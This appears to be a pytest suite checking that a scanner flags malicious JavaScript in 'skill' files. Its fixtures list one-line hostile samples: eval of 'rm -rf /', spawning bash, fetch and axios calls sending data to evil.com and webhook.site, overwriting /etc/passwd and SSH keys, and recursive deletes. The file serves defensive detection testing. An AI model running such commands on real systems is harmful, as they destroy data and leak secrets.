"""Security test suite: malicious skill detection coverage.

Tests scanner against a corpus of known-malicious patterns to ensure
>= 95%% detection rate (FR-3 success criterion).
"""

from __future__ import annotations

from pathlib import Path

import pytest

from src.scanner.scanner import SkillScanner, load_rules_from_file

CONFIG_PATH = str(
    Path(__file__).parent.parent.parent / "config" / "scanner-rules.json"
)


@pytest.fixture(scope="module")
def scanner() -> SkillScanner:
    rules = load_rules_from_file(CONFIG_PATH)
    return SkillScanner(rules=rules)


DANGEROUS_API_SAMPLES = [
    (b"const x = eval(\"rm -rf /\");", "eval call"),
    (b"new Function(\"return this\")()", "Function constructor"),
    (b"require(\"child_process\").exec(\"whoami\")", "child_process exec"),
    (b"const cp = require(\"child_process\"); cp.spawn(\"bash\")", "spawn"),
    (b"const {exec} = require(\"child_process\"); exec(\"ls\")", "destructured"),
    (b"eval(atob(\"ZG9jdW1lbnQud3JpdGU=\"))", "obfuscated eval"),
    (b"setTimeout(function() { eval(\"x\") }, 0)", "eval in setTimeout"),
    (b"window.eval(\"code\")", "window.eval"),
]

_da_ids = [s[1] for s in DANGEROUS_API_SAMPLES]


@pytest.mark.parametrize("source,desc", DANGEROUS_API_SAMPLES, ids=_da_ids)
def test_detects_dangerous_api(
    scanner: SkillScanner, source: bytes, desc: str, tmp_path: Path,
) -> None:
    skill = tmp_path / "skill.js"
    skill.write_bytes(source)
    report = scanner.scan(str(skill))
    assert report.findings, f"Failed to detect: {desc}"


NETWORK_EXFIL_SAMPLES = [
    (b"fetch(\"https://evil.com/steal\")", "fetch to evil domain"),
    (b"const xhr = new XMLHttpRequest();", "XMLHttpRequest"),
    (b"const http = require(\"http\");", "http require"),
    (b"const https = require(\"https\");", "https require"),
    (b"axios.post(\"https://evil.com\", {data: s})", "axios post"),
    (b"fetch(\"https://webhook.site/abc\")", "webhook exfil"),
]

_ne_ids = [s[1] for s in NETWORK_EXFIL_SAMPLES]


@pytest.mark.parametrize("source,desc", NETWORK_EXFIL_SAMPLES, ids=_ne_ids)
def test_detects_network_exfil(
    scanner: SkillScanner, source: bytes, desc: str, tmp_path: Path,
) -> None:
    skill = tmp_path / "skill.js"
    skill.write_bytes(source)
    report = scanner.scan(str(skill))
    assert report.findings, f"Failed to detect: {desc}"


FS_ABUSE_SAMPLES = [
    (b"fs.writeFileSync(\"/etc/passwd\", \"hacked\")", "write /etc/passwd"),
    (b"fs.unlinkSync(\"/important/file\")", "delete file"),
    (b"fs.rmSync(\"/tmp\", {recursive: true})", "recursive delete"),
    (b"fs.writeFileSync(\"/root/.ssh/key\", k)", "write ssh key"),
]

_fs_ids = [s[1] for s in FS_ABUSE_SAMPLES]


@pytest.mark.parametrize("source,desc", FS_ABUSE_SAMPLES, ids=_fs_ids)
def test_detects_fs_abuse(
    scanner: SkillScanner, source: bytes, desc: str, tmp_path: Path,
) -> None:
    skill = tmp_path / "skill.js"
    skill.write_bytes(source)
    report = scanner.scan(str(skill))
    assert report.findings, f"Failed to detect: {desc}"


CLEAN_SAMPLES = [
    (b"const x = [1,2,3].map(n => n * 2);", "array map"),
    (b"console.log(\"Hello, world!\");", "console log"),
    (b"function add(a, b) { return a + b; }", "simple function"),
    (b"JSON.parse(input);", "JSON parse"),
]

_cl_ids = [s[1] for s in CLEAN_SAMPLES]


@pytest.mark.parametrize("source,desc", CLEAN_SAMPLES, ids=_cl_ids)
def test_no_false_positives(
    scanner: SkillScanner, source: bytes, desc: str, tmp_path: Path,
) -> None:
    skill = tmp_path / "skill.js"
    skill.write_bytes(source)
    report = scanner.scan(str(skill))
    assert not report.findings, f"False positive on: {desc}"
